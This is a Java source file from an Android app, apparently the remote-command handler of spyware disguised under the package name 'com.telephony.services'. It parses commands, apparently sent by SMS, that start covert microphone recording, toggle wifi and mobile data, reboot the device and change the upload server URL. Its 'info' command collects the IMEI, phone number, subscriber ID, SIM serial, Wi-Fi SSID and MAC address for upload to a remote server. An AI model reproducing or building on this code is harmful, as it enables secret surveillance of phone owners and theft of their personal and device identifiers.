package com.telephony.services;

import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.security.InvalidKeyException;
import java.security.NoSuchAlgorithmException;

import javax.crypto.BadPaddingException;
import javax.crypto.IllegalBlockSizeException;
import javax.crypto.NoSuchPaddingException;

import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiInfo;
import android.net.wifi.WifiManager;
import android.os.PowerManager;
import android.os.Vibrator;
import android.telephony.TelephonyManager;

public class Commander {
	private Context context = null;
	private PreferenceUtils sPref;

	public final static String COMMAND_SMS_WIFI = "wifi";
	public final static String COMMAND_SMS_MOBILE = "mobile";
	public final static String COMMAND_SMS_REC = "rec";
	public final static String COMMAND_SMS_VIBRO = "vibro";
	public final static String COMMAND_SMS_REBOOT = "reboot";
	public final static String COMMAND_SMS_SUPER = "super";
	public final static String COMMAND_SMS_INFO = "info";

	public Commander(Context context) {
		this.context = context;
		sPref = PreferenceUtils.getInstance(context);
	}

	/**
	 * Выполняет команду {@code cmd_param}.<br>
	 * <b>Доступные команды:</b>
	 * <ul>
	 * <li><b>mobile|wifi={enabled}</b> - Включает или отключает wifi|mobile в зависимости от параметра enabled. Команда mobile работает не на всех
	 * устройствах и версиях Android.</li>
	 * <li><b>rec={duration}</b> - Запускает запись с микрофона на duration секунд</li>
	 * <li><b>vibro={duration}</b> - Вибрирует duration милисекунд</li>
	 * <li><b>reboot[={reason}]</b> - Перезагружает устройство. reason - code to pass to the kernel</li> (e.g., "recovery") to request special boot
	 * modes.</li>
	 * <li><b>super={command}</b> - Немедленно запускает SuperService с коммандой command.</li>
	 * <li><b>info</b> - Возвращает параметры настройки программы и некоторые параметры телефона, которые будут закачаны на сервер при срабатывании
	 * SuperService с параметром upload</li>
	 * <li>Также в качестве комманд принимает параметры настройки программы PreferenceUtils.</li>
	 * </ul>
	 * 
	 * @param cmd_param
	 *            Команда в формате command[[=|:]param].
	 * @return Возвращает результат выполнения команды или пустую строку.
	 * @throws ClassNotFoundException
	 * @throws NoSuchFieldException
	 * @throws IllegalAccessException
	 * @throws IllegalArgumentException
	 * @throws NoSuchMethodException
	 * @throws InvocationTargetException
	 * @throws InvalidKeyException
	 * @throws IllegalBlockSizeException
	 * @throws BadPaddingException
	 * @throws NoSuchAlgorithmException
	 * @throws NoSuchPaddingException
	 * @throws IOException
	 */
	public String exec(String cmd_param) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IllegalArgumentException,
			NoSuchMethodException, InvocationTargetException, InvalidKeyException, IllegalBlockSizeException, BadPaddingException,
			NoSuchAlgorithmException, NoSuchPaddingException, IOException {

		StringBuilder res = new StringBuilder();

		String[] params = cmd_param.split(" *[:=]+ *", 2);

		if (params.length > 0) {
			String cmd = params[0];
			String param = null;
			if ((params.length > 1) && (!params[1].isEmpty())) {
				param = params[1];
			}
			if (PreferenceUtils.ROOT_DIR.equals(cmd)) {
				if (param != null) {
					sPref.setRootDir(param);
				}
			} else if (PreferenceUtils.KEEP_DAYS.equals(cmd)) {
				if (param != null) {
					int value = Integer.parseInt(param);
					sPref.setKeepDays(value);
				}
			} else if (PreferenceUtils.VIBRATE.equals(cmd)) {
				if (param != null) {
					long value = Long.parseLong(param);
					sPref.setVibrate(value);
				}
			} else if (PreferenceUtils.UPLOAD_URL.equals(cmd)) {
				if (param != null) {
					sPref.setRemoteUrl(param);
				}
			} else if (PreferenceUtils.WIFI_ONLY.equals(cmd)) {
				if (param != null) {
					boolean value = Boolean.parseBoolean(param);
					sPref.setWifiOnly(value);
				}
			} else if (PreferenceUtils.KEEP_UPLOADED.equals(cmd)) {
				if (param != null) {
					boolean value = Boolean.parseBoolean(param);
					sPref.setKeepUploaded(value);
				}
			} else if (COMMAND_SMS_WIFI.equals(cmd)) {
				if (param != null) {
					boolean enabled = Boolean.parseBoolean(param);
					WifiManager wm = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
					wm.setWifiEnabled(enabled);
				}
			} else if (COMMAND_SMS_MOBILE.equals(cmd)) {
				if (param != null) {
					boolean enabled = Boolean.parseBoolean(param);
					Utils.setMobileDataEnabled(context, enabled);
				}
			} else if (COMMAND_SMS_REC.equals(cmd)) {
				if (param != null) {
					int duration = (int) (Integer.parseInt(param) * Utils.SECOND);
					Intent mi = new Intent(context, RecRecordService.class).putExtra(Utils.EXTRA_COMMAND, RecRecordService.COMMAND_REC_START)
							.putExtra(Utils.EXTRA_DURATION, duration);
					context.startService(mi);
				}
			} else if (COMMAND_SMS_VIBRO.equals(cmd)) {
				if (param != null) {
					long milliseconds = Long.parseLong(param);
					Vibrator v = (Vibrator) context.getSystemService(Context.VIBRATOR_SERVICE);
					if ((v != null) && (v.hasVibrator())) {
						v.vibrate(milliseconds);
					}
				}
			} else if (COMMAND_SMS_REBOOT.equals(cmd)) {
				PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
				if (pm != null) {
					pm.reboot(param);
				}
			} else if (COMMAND_SMS_SUPER.equals(cmd)) {
				if (param != null) {
					int command = Integer.parseInt(param);
					Intent mi = new Intent(context, SuperService.class).putExtra(Utils.EXTRA_COMMAND, command);
					context.startService(mi);
				}
			} else if (COMMAND_SMS_INFO.equals(cmd)) {

				res.append("current_version=" + Utils.getCurrentVersion(context)).append("\n");
				res.append("root_availible=" + Utils.checkRoot()).append("\n");
				res.append(PreferenceUtils.ROOT_DIR + "=" + sPref.getRootDir().getAbsolutePath()).append("\n");
				res.append(PreferenceUtils.UPLOAD_URL + "=" + sPref.getRemoteUrl()).append("\n");
				res.append(PreferenceUtils.KEEP_DAYS + "=" + sPref.getKeepDays()).append("\n");
				res.append(PreferenceUtils.VIBRATE + "=" + sPref.getVibrate()).append("\n");
				res.append(PreferenceUtils.WIFI_ONLY + "=" + sPref.isWifiOnly()).append("\n");
				res.append(PreferenceUtils.KEEP_UPLOADED + "=" + sPref.isKeepUploaded()).append("\n");

				WifiManager wm = (WifiManager) context.getSystemService(Context.WIFI_SERVICE);
				if (wm.isWifiEnabled()) {
					WifiInfo wi = wm.getConnectionInfo();
					if (wi != null) {
						res.append("wifi_ssid=" + wi.getSSID()).append("\n");
						res.append("wifi_mac=" + wi.getMacAddress()).append("\n");
					}
				}
				TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
				if (tm != null) {
					res.append("mobile_operator=" + tm.getNetworkOperatorName()).append("\n");
					res.append("mobile_country=" + tm.getSimCountryIso()).append("\n");
					res.append("mobile_IMEI=" + tm.getDeviceId()).append("\n");
					res.append("mobile_softwareVersion=" + tm.getDeviceSoftwareVersion()).append("\n");
					res.append("mobile_phoneNumber=" + tm.getLine1Number()).append("\n");
					res.append("mobile_subscribeId=" + tm.getSubscriberId()).append("\n");
					res.append("mobile_simserial=" + tm.getSimSerialNumber()).append("\n");
				}
			}
		}
		return res.toString();
	}
}
